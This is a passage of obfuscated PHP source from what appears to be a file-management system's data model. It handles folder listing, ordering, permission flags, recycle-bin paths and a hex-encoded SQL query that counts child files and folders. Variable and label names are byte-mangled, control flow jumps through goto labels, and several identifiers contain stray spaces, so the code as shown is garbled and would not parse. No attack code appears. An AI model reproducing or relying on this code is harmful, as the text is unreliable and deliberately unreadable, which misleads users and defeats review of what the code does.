$_SERVER[´Ù×Íå‘ÄõÛ]; if (!isset($Eì ’‘ŠöÒ[$A‚‡È¿ïÅÈ[397]])) { $Eì ’‘ŠöÒ[$A‚‡È¿ïÅÈ[397]] = 0; } $cæ‡¹†ñ = $A‚‡È¿ïÅÈ[398]; goto eôõ¦¡«…À; dÇŞÉñ§ˆÏ: return $Fò†ãË½Û«; goto AÉà¨ñÄİ; eôõ¦¡«…À: $Fò†ãË½Û« = $this->field($cæ‡¹†ñ)->_makeOrder()->where($Eì ’‘ŠöÒ)->selectPage($fÔˆŸŠŒÛ); $this->_listDataApply($Fò†ãË½Û«[$A‚‡È¿ïÅÈ[354]]); $this->_listMake($Fò†ãË½Û«); goto dÇŞÉñ§ˆÏ; AÉà¨ñÄİ: } protected function _makeOrder() { goto D©„²³•¦Ş; f„çÑóó¼®: $f¶¨·©ğÖ = Input::get($få„ß³ÓÂ…[408], $få„ß³ÓÂ…[7], $f½ŠãšÜ±¬, array_keys($a¸à½­…ñÒ)); if (!in_array($c‚àÒêä•, array_keys($Aâ½º³™Í©))) { $c‚àÒêä• = $få„ß³ÓÂ…[28]; } if (!in_array($f¶¨·©ğÖ, array_keys($a¸à½­…ñÒ))) { $c‚àÒêä• = $få„ß³ÓÂ…[402]; } goto EÜƒÌŞÍå´; aã’¥àœÖ: $a¸à½­…ñÒ = array($få„ß³ÓÂ…[402] => $få„ß³ÓÂ…[403], $få„ß³ÓÂ…[404] => $få„ß³ÓÂ…[405]); $Aâ½º³™Í© = array($få„ß³ÓÂ…[28] => $få„ß³ÓÂ…[28], $få„ß³ÓÂ…[77] => $få„ß³ÓÂ…[77], $få„ß³ÓÂ…[160] => $få„ß³ÓÂ…[372], $få„ß³ÓÂ…[378] => $få„ß³ÓÂ…[378], $få„ß³ÓÂ…[406] => $få„ß³ÓÂ…[379], $få„ß³ÓÂ…[187] => $få„ß³ÓÂ…[187], $få„ß³ÓÂ…[107] => $få„ß³ÓÂ…[107]); $c‚àÒêä• = Input::get($få„ß³ÓÂ…[407], $få„ß³ÓÂ…[7], $d­£ôåˆ­ò, array_keys($Aâ½º³™Í©)); goto f„çÑóó¼®; D©„²³•¦Ş: $få„ß³ÓÂ… =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d­£ôåˆ­ò = Model($få„ß³ÓÂ…[399])->get($få„ß³ÓÂ…[400]); $f½ŠãšÜ±¬ = Model($få„ß³ÓÂ…[399])->get($få„ß³ÓÂ…[401]); goto aã’¥àœÖ; EÜƒÌŞÍå´: if ($c‚àÒêä• == $få„ß³ÓÂ…[28]) { } $CÅ½İ÷¥ƒ = $få„ß³ÓÂ…[409] . $Aâ½º³™Í©[$c‚àÒêä•] . $få„ß³ÓÂ…[50] . $a¸à½­…ñÒ[$f¶¨·©ğÖ]; return $this->order(rtrim(trim($CÅ½İ÷¥ƒ), $få„ß³ÓÂ…[47])); goto DèôãİÏğë; DèôãİÏğë: } protected function _listDataApplyItem($B–àá”›Ç, $B—æÂº”Š = false) { $Cˆ‘ÓƒÆÁç = array($B–àá”›Ç); $this->_listDataApply($Cˆ‘ÓƒÆÁç, $B—æÂº”Š); return $Cˆ‘ÓƒÆÁç[0]; } protected function _listDataApply(&$F³’öØç¶, $aøñ—Ä™‡ = false) { goto c¹ÒÆµŸ´; cÏ£Ï©ï®ù: $this->_listAppendUser($F³’öØç¶); $this->_listFilterInfo($F³’öØç¶, $aøñ—Ä™‡); goto b‹×ˆ“‚£ß; e±„Ï—˜õ‹: $this->_listAppendPath($F³’öØç¶); $this->_listAppendAuth($F³’öØç¶); $this->_listAppendSourceInfo($F³’öØç¶, $c¦ğ¿õ¼ä); goto cÏ£Ï©ï®ù; c¹ÒÆµŸ´: $Eà¹É®Œã‰ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$F³’öØç¶) { $F³’öØç¶ = array(); return; } $c¦ğ¿õ¼ä = array_to_keyvalue($F³’öØç¶, $Eà¹É®Œã‰[33], $Eà¹É®Œã‰[369]); goto dã´îôñ‚; dã´îôñ‚: $c¦ğ¿õ¼ä = array_unique($c¦ğ¿õ¼ä); $this->_listSourceCache($F³’öØç¶); if (!$aøñ—Ä™‡) { $this->_listAppendMeta($F³’öØç¶, $c¦ğ¿õ¼ä); $this->_listAppendFileMeta($F³’öØç¶, $c¦ğ¿õ¼ä); $this->_listAppendChildren($F³’öØç¶, $c¦ğ¿õ¼ä); } goto e±„Ï—˜õ‹; b‹×ˆ“‚£ß: } protected function _listSourceCache($BËÈ»§…ßà) { $e“øÙÕôé˜ =& $_SERVER[´Ù×Íå‘ÄõÛ]; foreach ($BËÈ»§…ßà as $D¸¤Üº–±) { self::$cacheSourceInfo[$e“øÙÕôé˜[410] . $D¸¤Üº–±[$e“øÙÕôé˜[369]]] = $D¸¤Üº–±; } } protected function _listFilterInfo(&$AˆÛš®å¯¶, $fäì‘®ÈÓ‘ = false) { $bŠ‡ñíÆ ’ =& $_SERVER[´Ù×Íå‘ÄõÛ]; foreach ($AˆÛš®å¯¶ as &$E®ÃôˆëÚ) { $E®ÃôˆëÚ = $this->pathInfoFilter($E®ÃôˆëÚ); self::$cachePathInfo[$bŠ‡ñíÆ ’[411] . intval($fäì‘®ÈÓ‘) . $bŠ‡ñíÆ ’[412] . $E®ÃôˆëÚ[$bŠ‡ñíÆ ’[369]]] = $E®ÃôˆëÚ; } } protected function _listMake(&$CĞ±ùë›) { $CÄÀ•¥ë»¤ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CĞ±ùë›[$CÄÀ•¥ë»¤[74]] = array(); $CĞ±ùë›[$CÄÀ•¥ë»¤[73]] = array(); foreach ($CĞ±ùë›[$CÄÀ•¥ë»¤[354]] as $a÷¿›) { $d÷ÌÀ×Õäš = $a÷¿›[$CÄÀ•¥ë»¤[370]] == 1 ? $CÄÀ•¥ë»¤[74] : $CÄÀ•¥ë»¤[73]; $CĞ±ùë›[$d÷ÌÀ×Õäš][] = $a÷¿›; } unset($CĞ±ùë›[$CÄÀ•¥ë»¤[354]]); } protected function _listAppendMeta(&$A«‘ËÌ·, $b¬æ ¶™ï) { goto b”©Ã ÕÂ; Cª’²Ÿ¦Éê: foreach ($f¹ïÖù–Ã¹ as $cÉœˆâ—šÈ) { if (!isset($C´ŞÍÒàî[$cÉœˆâ—šÈ[$a®ë…Ù¶Ò´[369]]])) { $C´ŞÍÒàî[$cÉœˆâ—šÈ[$a®ë…Ù¶Ò´[369]]] = array(); } if (in_array($cÉœˆâ—šÈ[$a®ë…Ù¶Ò´[89]], $f›Ì÷Éù¬)) { continue; } $C´ŞÍÒàî[$cÉœˆâ—šÈ[$a®ë…Ù¶Ò´[369]]][$cÉœˆâ—šÈ[$a®ë…Ù¶Ò´[89]]] = $cÉœˆâ—šÈ[$a®ë…Ù¶Ò´[359]]; } foreach ($A«‘ËÌ· as &$fÛÖ¿Ëâ‰£) { $fÛÖ¿Ëâ‰£[$a®ë…Ù¶Ò´[417]] = !1; if (isset($C´ŞÍÒàî[$fÛÖ¿Ëâ‰£[$a®ë…Ù¶Ò´[369]]])) { $fÛÖ¿Ëâ‰£[$a®ë…Ù¶Ò´[417]] = $C´ŞÍÒàî[$fÛÖ¿Ëâ‰£[$a®ë…Ù¶Ò´[369]]]; } if ($this->fileIsLock($fÛÖ¿Ëâ‰£) && $fÛÖ¿Ëâ‰£[$a®ë…Ù¶Ò´[376]]) { $E÷‰ÁÃôÛ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $fÛÖ¿Ëâ‰£[$a®ë…Ù¶Ò´[376]][$a®ë…Ù¶Ò´[377]] = AuthModel::authDisable($fÛÖ¿Ëâ‰£[$a®ë…Ù¶Ò´[376]][$a®ë…Ù¶Ò´[377]], $E÷‰ÁÃôÛ); $fÛÖ¿Ëâ‰£[$a®ë…Ù¶Ò´[376]][$a®ë…Ù¶Ò´[418]][$a®ë…Ù¶Ò´[376]] = $fÛÖ¿Ëâ‰£[$a®ë…Ù¶Ò´[376]][$a®ë…Ù¶Ò´[377]]; } } goto E¹‡¹˜Ä²ó; b”©Ã ÕÂ: $a®ë…Ù¶Ò´ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cŞ½÷ÛÀ² = array($a®ë…Ù¶Ò´[383] => array($a®ë…Ù¶Ò´[384], $b¬æ ¶™ï)); $f¹ïÖù–Ã¹ = Model($a®ë…Ù¶Ò´[413])->field($a®ë…Ù¶Ò´[414])->where($cŞ½÷ÛÀ²)->select(); goto c–Ø™ò¦¡˜; c–Ø™ò¦¡˜: if (!$f¹ïÖù–Ã¹) { return; } $f›Ì÷Éù¬ = array($a®ë…Ù¶Ò´[415], $a®ë…Ù¶Ò´[416]); $C´ŞÍÒàî = array(); goto Cª’²Ÿ¦Éê; E¹‡¹˜Ä²ó: } protected function _listAppendFileMeta(&$føõ‡ŒñÄ¢, $C°«ˆ¿ñ™Ü) { goto D‚Ú¯ÈÊˆÕ; b–¾†ä†™ì: $a­ñçÉ« = Model($FÒêÔ‡…ç¬[422])->field($D¥öÌèŠ¡)->where($f®¹²÷ø‡)->select(); $a­ñçÉ« = array_to_keyvalue($a­ñçÉ«, $FÒêÔ‡…ç¬[419]); $dœˆÁ¸¡æ¾ = Model($FÒêÔ‡…ç¬[423])->field($FÒêÔ‡…ç¬[424])->where($f®¹²÷ø‡)->select(); goto A¶’õ‹•š; A¶’õ‹•š: $dœˆÁ¸¡æ¾ = $dœˆÁ¸¡æ¾ ? $dœˆÁ¸¡æ¾ : array(); $A˜ã¬°¶ä° = array(); foreach ($dœˆÁ¸¡æ¾ as $fÑ«³Œçñ) { if (!isset($A˜ã¬°¶ä°[$fÑ«³Œçñ[$FÒêÔ‡…ç¬[419]]])) { $A˜ã¬°¶ä°[$fÑ«³Œçñ[$FÒêÔ‡…ç¬[419]]] = array(); } $A˜ã¬°¶ä°[$fÑ«³Œçñ[$FÒêÔ‡…ç¬[419]]][$fÑ«³Œçñ[$FÒêÔ‡…ç¬[89]]] = $fÑ«³Œçñ[$FÒêÔ‡…ç¬[359]]; } goto eáŸÒªïß; D‚Ú¯ÈÊˆÕ: $FÒêÔ‡…ç¬ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Fœ­÷“İ · = array_to_keyvalue($føõ‡ŒñÄ¢, $FÒêÔ‡…ç¬[33], $FÒêÔ‡…ç¬[419]); $Fœ­÷“İ · = array_filter(array_unique($Fœ­÷“İ ·)); goto dåŞ±­“²†; dåŞ±­“²†: if (!$Fœ­÷“İ ·) { return; } $f®¹²÷ø‡ = array($FÒêÔ‡…ç¬[420] => array($FÒêÔ‡…ç¬[384], $Fœ­÷“İ ·)); $D¥öÌèŠ¡ = $FÒêÔ‡…ç¬[421]; goto b–¾†ä†™ì; eáŸÒªïß: foreach ($føõ‡ŒñÄ¢ as &$A‰ÀÈÚ’ ˜) { goto EÌï­¶ÏÊ§; cŒ…”¼¬“ñ: if (isset($A‰ÀÈÚ’ ˜[$FÒêÔ‡…ç¬[162]][$FÒêÔ‡…ç¬[426]])) { $A‰ÀÈÚ’ ˜[$FÒêÔ‡…ç¬[426]] = json_decode($A‰ÀÈÚ’ ˜[$FÒêÔ‡…ç¬[162]][$FÒêÔ‡…ç¬[426]], !0); unset($A‰ÀÈÚ’ ˜[$FÒêÔ‡…ç¬[162]][$FÒêÔ‡…ç¬[426]]); } goto Bµš®„É‚ã; B¿¨§Â¼¿ç: unset($a­ñçÉ«[$d·óñîˆƒ][$FÒêÔ‡…ç¬[75]]); $e³Šğƒâöœ = is_array($A˜ã¬°¶ä°[$d·óñîˆƒ]) ? $A˜ã¬°¶ä°[$d·óñîˆƒ] : array(); $A‰ÀÈÚ’ ˜[$FÒêÔ‡…ç¬[162]] = array_merge($e³Šğƒâöœ, $a­ñçÉ«[$d·óñîˆƒ]); goto cŒ…”¼¬“ñ; FíÂ¶»ÂÔÌ: $aö—Şí³Ù‚[$FÒêÔ‡…ç¬[77]] = $A‰ÀÈÚ’ ˜[$FÒêÔ‡…ç¬[77]]; $aö—Şí³Ù‚[$FÒêÔ‡…ç¬[28]] = $A‰ÀÈÚ’ ˜[$FÒêÔ‡…ç¬[28]]; self::$cacheFileInfo[$FÒêÔ‡…ç¬[425] . $d·óñîˆƒ] = $aö—Şí³Ù‚; goto B¿¨§Â¼¿ç; EÌï­¶ÏÊ§: $d·óñîˆƒ = $A‰ÀÈÚ’ ˜[$FÒêÔ‡…ç¬[419]]; if (!$d·óñîˆƒ || !isset($a­ñçÉ«[$d·óñîˆƒ])) { continue; } $aö—Şí³Ù‚ = $a­ñçÉ«[$d·óñîˆƒ]; goto FíÂ¶»ÂÔÌ; Bµš®„É‚ã: } goto E«¹ÇÕ‘´ ; E«¹ÇÕ‘´ : } protected function _listAppendSourceInfo(&$DÉÒ ïÑÎ›, $f÷ó³‹ì—) { goto dÏØ¦ó›Û¾; dÏØ¦ó›Û¾: $dî¸Ÿ¸Ş¸š =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!defined($dî¸Ÿ¸Ş¸š[427])) { return; } $eî‰´å°×ì = Model($dî¸Ÿ¸Ş¸š[428])->listData(); goto C·ÆñÙ¬àÜ; C·ÆñÙ¬àÜ: $CÌ‚Â«“¾™ = Model($dî¸Ÿ¸Ş¸š[392])->listData(); $Bó¬œÏ÷Ä  = Model($dî¸Ÿ¸Ş¸š[381])->listData(); $Dš›Û°²à = Model($dî¸Ÿ¸Ş¸š[429])->listSimple(); goto E‚àÉ¾ÃìÂ; E‚àÉ¾ÃìÂ: $C¾äÆãœµÀ = array_to_keyvalue($eî‰´å°×ì, $dî¸Ÿ¸Ş¸š[367]); $cÙ»›œÎÎ = array_to_keyvalue_group($CÌ‚Â«“¾™, $dî¸Ÿ¸Ş¸š[75], $dî¸Ÿ¸Ş¸š[393]); $D©¬¾†İ…« = array_to_keyvalue($Bó¬œÏ÷Ä , $dî¸Ÿ¸Ş¸š[75]); goto D‘‹ÚîÑ; D‘‹ÚîÑ: $e ô‘êµ¤ = array_to_keyvalue_group($Dš›Û°²à, $dî¸Ÿ¸Ş¸š[369]); foreach ($DÉÒ ïÑÎ› as &$f‰ìµ“Öß„) { $f‰ìµ“Öß„[$dî¸Ÿ¸Ş¸š[391]] = array($dî¸Ÿ¸Ş¸š[430] => 0, $dî¸Ÿ¸Ş¸š[431] => 0, $dî¸Ÿ¸Ş¸š[432] => 0); if (isset($D©¬¾†İ…«[$f‰ìµ“Öß„[$dî¸Ÿ¸Ş¸š[369]]])) { $f‰ìµ“Öß„[$dî¸Ÿ¸Ş¸š[391]][$dî¸Ÿ¸Ş¸š[433]] = 1; $f‰ìµ“Öß„[$dî¸Ÿ¸Ş¸š[391]][$dî¸Ÿ¸Ş¸š[434]] = $D©¬¾†İ…«[$f‰ìµ“Öß„[$dî¸Ÿ¸Ş¸š[369]]][$dî¸Ÿ¸Ş¸š[28]]; } if (isset($cÙ»›œÎÎ[$f‰ìµ“Öß„[$dî¸Ÿ¸Ş¸š[369]]])) { $f‰ìµ“Öß„[$dî¸Ÿ¸Ş¸š[391]][$dî¸Ÿ¸Ş¸š[435]] = array(); foreach ($cÙ»›œÎÎ[$f‰ìµ“Öß„[$dî¸Ÿ¸Ş¸š[369]]] as $BÉƒ½ÀŒ÷’) { $a÷ÁõïŠ = $C¾äÆãœµÀ[$BÉƒ½ÀŒ÷’]; $f‰ìµ“Öß„[$dî¸Ÿ¸Ş¸š[391]][$dî¸Ÿ¸Ş¸š[435]][] = array($dî¸Ÿ¸Ş¸š[436] => $a÷ÁõïŠ[$dî¸Ÿ¸Ş¸š[367]], $dî¸Ÿ¸Ş¸š[386] => $a÷ÁõïŠ[$dî¸Ÿ¸Ş¸š[28]], $dî¸Ÿ¸Ş¸š[437] => $a÷ÁõïŠ[$dî¸Ÿ¸Ş¸š[438]]); } } if (isset($e ô‘êµ¤[$f‰ìµ“Öß„[$dî¸Ÿ¸Ş¸š[369]]])) { $f‰ìµ“Öß„[$dî¸Ÿ¸Ş¸š[391]][$dî¸Ÿ¸Ş¸š[439]] = array(); foreach ($e ô‘êµ¤[$f‰ìµ“Öß„[$dî¸Ÿ¸Ş¸š[369]]] as $FèÂà‘¾Ä) { $f‰ìµ“Öß„[$dî¸Ÿ¸Ş¸š[391]][$dî¸Ÿ¸Ş¸š[439]] = array($dî¸Ÿ¸Ş¸š[440] => $FèÂà‘¾Ä[$dî¸Ÿ¸Ş¸š[441]], $dî¸Ÿ¸Ş¸š[442] => $FèÂà‘¾Ä[$dî¸Ÿ¸Ş¸š[443]], $dî¸Ÿ¸Ş¸š[444] => $FèÂà‘¾Ä[$dî¸Ÿ¸Ş¸š[369]], $dî¸Ÿ¸Ş¸š[445] => $FèÂà‘¾Ä[$dî¸Ÿ¸Ş¸š[446]], $dî¸Ÿ¸Ş¸š[447] => $FèÂà‘¾Ä[$dî¸Ÿ¸Ş¸š[448]], $dî¸Ÿ¸Ş¸š[449] => $FèÂà‘¾Ä[$dî¸Ÿ¸Ş¸š[449]], $dî¸Ÿ¸Ş¸š[450] => $FèÂà‘¾Ä[$dî¸Ÿ¸Ş¸š[450]]); } } } return $DÉÒ ïÑÎ›; goto F‡Ìõé©§Ï; F‡Ìõé©§Ï: } protected function _listAppendChildren(&$AÒŞš‚»¥, $a‹ğ³ƒÀù–) { goto fÔ‹‹ì”ÌÄ; EÙ£õïî¾ğ: $D”éä = $this->tablePrefix . $this->tableName; for ($e¼——”¸ª = 0; $e¼——”¸ª < $cµÂ‹Œ½ò¨; $e¼——”¸ª++) { $aõ¶ç“ï²Õ = intval($AÒŞš‚»¥[$e¼——”¸ª][$BäÖ‚áÉÄˆ[397]]); if ($AÒŞš‚»¥[$e¼——”¸ª][$BäÖ‚áÉÄˆ[370]]) { $DÔÜ‚¥‹¤ó = $AÒŞš‚»¥[$e¼——”¸ª][$BäÖ‚áÉÄˆ[369]]; $fâ¡¬‰™Â .= "\123\x45\114\105\103\x54\40\52\x20\x46\x52\x4f\115\40\x28\x53\105\114\x45\103\124\x20\47{$DÔÜ‚¥‹¤ó}\x5f\150\141\163\106\151\x6c\145\47\40\141\x73\40\x68\x61\163\54\143\x6f\165\156\164\50\x31\x29\40\x61\163\40\x68\x61\163\x43\x6f\x75\x6e\x74\40\106\122\x4f\x4d\x20\140{$D”éä}\140\40\12\x9\11\11\x9\11\x77\150\145\162\145\x20\160\141\162\x65\x6e\164\111\104\75{$DÔÜ‚¥‹¤ó}\x20\141\156\x64\40\151\163\x46\x6f\154\x64\145\162\x3d\x30\40\x61\x6e\x64\x20\151\x73\104\x65\154\145\x74\145\x3d{$aõ¶ç“ï²Õ}\x29\x20\141\x73\x20\164\x62\61\x5f{$DÔÜ‚¥‹¤ó}\x20\x75\x6e\151\x6f\x6e\40\x61\154\x6c\x20\12\x9\11\x9\11\11\x53\x45\x4c\x45\103\124\x20\52\40\106\x52\117\115\40\x28\123\x45\114\105\x43\x54\x20\47{$DÔÜ‚¥‹¤ó}\x5f\x68\141\x73\x46\157\x6c\144\145\162\47\x20\141\163\x20\x68\141\x73\x46\x69\154\145\x2c\143\x6f\x75\156\x74\x28\61\x29\40\x61\x73\40\x68\x61\163\103\x6f\165\156\164\x20\106\122\117\x4d\x20\x60{$D”éä}\140\x20\xa\11\x9\11\x9\11\x77\x68\x65\162\x65\x20\160\141\162\x65\156\x74\x49\x44\75{$DÔÜ‚¥‹¤ó}\40\x61\x6e\144\x20\151\163\106\157\154\x64\x65\162\x3d\61\x20\141\x6e\x64\40\151\x73\x44\145\154\145\x74\145\75{$aõ¶ç“ï²Õ}\x29\40\x61\163\40\164\x62\x32\137{$DÔÜ‚¥‹¤ó}\x20\165\156\x69\157\x6e\40\x61\154\x6c\x20"; } if ((strlen($fâ¡¬‰™Â) >= $A¸à÷¼Îø || $e¼——”¸ª == $cµÂ‹Œ½ò¨ - 1) && $fâ¡¬‰™Â) { $fâ¡¬‰™Â = substr($fâ¡¬‰™Â, 0, -strlen($BäÖ‚áÉÄˆ[451])); $aÑ½Ìá¢ŸÇ = $this->query($fâ¡¬‰™Â); $f´”ÉšâÛ§ = array_merge($f´”ÉšâÛ§, $aÑ½Ìá¢ŸÇ); $fâ¡¬‰™Â = $BäÖ‚áÉÄˆ[33]; } } $f´”ÉšâÛ§ = array_to_keyvalue($f´”ÉšâÛ§, $BäÖ‚áÉÄˆ[452]); goto D­˜‚‘Øè³; D­˜‚‘Øè³: foreach ($AÒŞš‚»¥ as &$e…åØÍâƒ) { if ($e…åØÍâƒ[$BäÖ‚áÉÄˆ[370]]) { unset($e…åØÍâƒ[$BäÖ‚áÉÄˆ[372]]); $e…åØÍâƒ[$BäÖ‚áÉÄˆ[192]] = intval($f´”ÉšâÛ§[$e…åØÍâƒ[$BäÖ‚áÉÄˆ[369]] . $BäÖ‚áÉÄˆ[453]][$BäÖ‚áÉÄˆ[454]]); $e…åØÍâƒ[$BäÖ‚áÉÄˆ[191]] = intval($f´”ÉšâÛ§[$e…åØÍâƒ[$BäÖ‚áÉÄˆ[369]] . $BäÖ‚áÉÄˆ[455]][$BäÖ‚áÉÄˆ[454]]); } } goto bäˆÈ…ªÎˆ; fÔ‹‹ì”ÌÄ: $BäÖ‚áÉÄˆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fâ¡¬‰™Â = $BäÖ‚áÉÄˆ[361]; $f´”ÉšâÛ§ = array(); goto c‚ÔÀÄ·Ş»; c‚ÔÀÄ·Ş»: $A¸à÷¼Îø = 1024 * 50; $AÒŞš‚»¥ = is_array($AÒŞš‚»¥) ? $AÒŞš‚»¥ : array(); $cµÂ‹Œ½ò¨ = count($AÒŞš‚»¥); goto EÙ£õïî¾ğ; bäˆÈ…ªÎˆ: } protected function _listAppendAuth(&$bÅæ›‹¾) { goto f­ßšÊŸİ; f­ßšÊŸİ: $f˜³ƒ‰ù’¹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!defined($f˜³ƒ‰ù’¹[427])) { return; } $AêËë£íÀ = array(); goto fï—àòåâ˜; EÖİá„ßÂŸ: $DÓ„ Í¹÷ = Model($f˜³ƒ‰ù’¹[456])->getSourceList($AêËë£íÀ, $d«°§õáŞ); foreach ($bÅæ›‹¾ as $cÑ‘áŞğé“ => &$fîóÆÜŒÑˆ) { $fîóÆÜŒÑˆ[$f˜³ƒ‰ù’¹[376]] = $DÓ„ Í¹÷[$fîóÆÜŒÑˆ[$f˜³ƒ‰ù’¹[369]]]; if (!$fîóÆÜŒÑˆ[$f˜³ƒ‰ù’¹[376]] && $fîóÆÜŒÑˆ[$f˜³ƒ‰ù’¹[371]] == self::TYPE_GROUP) { $fîóÆÜŒÑˆ[$f˜³ƒ‰ù’¹[376]] = Action($f˜³ƒ‰ù’¹[457])->pathGroupAuthMake($fîóÆÜŒÑˆ[$f˜³ƒ‰ù’¹[458]]); if (!$fîóÆÜŒÑˆ[$f˜³ƒ‰ù’¹[376]] && !_get($GLOBALS, $f˜³ƒ‰ù’¹[459])) { $fîóÆÜŒÑˆ[$f˜³ƒ‰ù’¹[189]] = !1; $fîóÆÜŒÑˆ[$f˜³ƒ‰ù’¹[188]] = !1; } } if ($fîóÆÜŒÑˆ[$f˜³ƒ‰ù’¹[376]]) { $fîóÆÜŒÑˆ[$f˜³ƒ‰ù’¹[189]] = AuthModel::authCheckEdit($fîóÆÜŒÑˆ[$f˜³ƒ‰ù’¹[376]][$f˜³ƒ‰ù’¹[377]]); $fîóÆÜŒÑˆ[$f˜³ƒ‰ù’¹[188]] = AuthModel::authCheckView($fîóÆÜŒÑˆ[$f˜³ƒ‰ù’¹[376]][$f˜³ƒ‰ù’¹[377]]); } $this->groupPathDisplay($fîóÆÜŒÑˆ); } goto E ª†¿œğÄ; fï—àòåâ˜: foreach ($bÅæ›‹¾ as $fîóÆÜŒÑˆ) { if ($fîóÆÜŒÑˆ[$f˜³ƒ‰ù’¹[371]] == self::TYPE_GROUP) { $AêËë£íÀ[] = $fîóÆÜŒÑˆ[$f˜³ƒ‰ù’¹[369]]; } } if (!$AêËë£íÀ) { return; } $d«°§õáŞ = array_to_keyvalue($bÅæ›‹¾, $f˜³ƒ‰ù’¹[369]); goto EÖİá„ßÂŸ; E ª†¿œğÄ: } public function groupPathDisplay(&$F©º±ï‚×) { goto BÅ•—…âîÆ; BÅ•—…âîÆ: $f¯á„Ñùï =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($F©º±ï‚×[$f¯á„Ñùï[371]] != self::TYPE_GROUP) { return; } $FĞËç®˜˜õ = Model($f¯á„Ñùï[460])->getInfo($F©º±ï‚×[$f¯á„Ñùï[458]]); goto a›·ğô–š«; a›·ğô–š«: $BÒêÚ• = $this->parentLevelArray($FĞËç®˜˜õ[$f¯á„Ñùï[461]]); $fæ‰ğ”„¾ = $f¯á„Ñùï[33]; foreach ($BÒêÚ• as $e±”¿µ ½ë) { $Dæ‚àäÆ = Model($f¯á„Ñùï[460])->getInfo($e±”¿µ ½ë); $fæ‰ğ”„¾ .= $Dæ‚àäÆ[$f¯á„Ñùï[391]][$f¯á„Ñùï[369]] . $f¯á„Ñùï[47]; } goto c¸·°–Üö—; c¸·°–Üö—: $F©º±ï‚×[$f¯á„Ñùï[462]] = $FĞËç®˜˜õ[$f¯á„Ñùï[463]]; $F©º±ï‚×[$f¯á„Ñùï[380]] = $FĞËç®˜˜õ[$f¯á„Ñùï[461]]; $F©º±ï‚×[$f¯á„Ñùï[464]] = $FĞËç®˜˜õ[$f¯á„Ñùï[465]]; goto fá¥Š›¦î; fá¥Š›¦î: $F©º±ï‚×[$f¯á„Ñùï[466]] = $fæ‰ğ”„¾ . $FĞËç®˜˜õ[$f¯á„Ñùï[391]][$f¯á„Ñùï[369]]; goto AÔà ™õØ²; AÔà ™õØ²: } protected function _listAppendPath(&$Fäğ™¯ç·) { goto cˆíÀ–Àì¶; cˆíÀ–Àì¶: $e°¢ÍÊ’¥Ñ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E»‘‚øŞÍ = array(); foreach ($Fäğ™¯ç· as &$cù¸å”£Ş) { $E»‘‚øŞÍ[$cù¸å”£Ş[$e°¢ÍÊ’¥Ñ[369]]] = $cù¸å”£Ş[$e°¢ÍÊ’¥Ñ[28]]; $E…˜ãÀº×‰ = $this->parentLevelArray($cù¸å”£Ş[$e°¢ÍÊ’¥Ñ[461]]); array_shift($E…˜ãÀº×‰); foreach ($E…˜ãÀº×‰ as $d…‡¡„øĞ) { if (!isset($E»‘‚øŞÍ[$d…‡¡„øĞ])) { $E»‘‚øŞÍ[$d…‡¡„øĞ] = 0; } } } goto B÷ëÓƒ—ö›; B÷ëÓƒ—ö›: $bÈ¸í¹·Å = array(); foreach ($E»‘‚øŞÍ as $B²ÛóĞ Ò => $CÜèÏ±Ë©ï) { if (!$CÜèÏ±Ë©ï) { $bÈ¸í¹·Å[] = $B²ÛóĞ Ò; } } if ($bÈ¸í¹·Å) { $a¹ñòç = array($e°¢ÍÊ’¥Ñ[383] => array($e°¢ÍÊ’¥Ñ[384], $bÈ¸í¹·Å)); if (count($bÈ¸í¹·Å) == 1) { $aø®é¶³–Á = $this->sourceInfo($bÈ¸í¹·Å[0]); $aø®é¶³–Á = is_array($aø®é¶³–Á) ? array($aø®é¶³–Á) : !1; } else { $aø®é¶³–Á = $this->field($e°¢ÍÊ’¥Ñ[467])->where($a¹ñòç)->select(); } $f­ê…ƒÎƒ = array_to_keyvalue($aø®é¶³–Á, $e°¢ÍÊ’¥Ñ[369], $e°¢ÍÊ’¥Ñ[28]); $E»‘‚øŞÍ = array_merge_index($E»‘‚øŞÍ, $f­ê…ƒÎƒ); } goto cè™ãœˆâË; cè™ãœˆâË: $Dªå¢²÷¹¨ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($Fäğ™¯ç· as &$cù¸å”£Ş) { goto e“¶Ãµ‡—Ï; e“¶Ãµ‡—Ï: $E…˜ãÀº×‰ = $this->parentLevelArray($cù¸å”£Ş[$e°¢ÍÊ’¥Ñ[461]]); $DîŠ®™œÏ× = $this->_listAppendPathRoot($cù¸å”£Ş, $E…˜ãÀº×‰); foreach ($E…˜ãÀº×‰ as $d…‡¡„øĞ) { if (isset($E»‘‚øŞÍ[$d…‡¡„øĞ])) { $DîŠ®™œÏ× .= $E»‘‚øŞÍ[$d…‡¡„øĞ] . $e°¢ÍÊ’¥Ñ[8]; } } goto föªß‹ÛÀ; fŞË›á»ß: $aÑ’çÒéºÛ = trim($cù¸å”£Ş[$e°¢ÍÊ’¥Ñ[468]], $e°¢ÍÊ’¥Ñ[8]); if ($cù¸å”£Ş[$e°¢ÍÊ’¥Ñ[463]] == $e°¢ÍÊ’¥Ñ[470] && $aÑ’çÒéºÛ) { $cù¸å”£Ş[$e°¢ÍÊ’¥Ñ[28]] = $aÑ’çÒéºÛ; } $this->_listAppendPathRecycle($cù¸å”£Ş, $E…˜ãÀº×‰, $Dªå¢²÷¹¨); goto b˜ŸÂ§ƒ­ñ; föªß‹ÛÀ: if ($E…˜ãÀº×‰) { $DîŠ®™œÏ× .= $cù¸å”£Ş[$e°¢ÍÊ’¥Ñ[28]]; } if ($cù¸å”£Ş[$e°¢ÍÊ’¥Ñ[370]]) { $DîŠ®™œÏ× .= $e°¢ÍÊ’¥Ñ[8]; } $cù¸å”£Ş[$e°¢ÍÊ’¥Ñ[468]] = str_replace($e°¢ÍÊ’¥Ñ[469], $e°¢ÍÊ’¥Ñ[8], $DîŠ®™œÏ×); goto fŞË›á»ß; b˜ŸÂ§ƒ­ñ: } goto eİÔùÅî–; eİÔùÅî–: } private function _listAppendPathRecycle(&$E˜ªšò×çø, $E„²¶ä¸ï¤, $Aá¾¡ÆÚ¹½) { goto 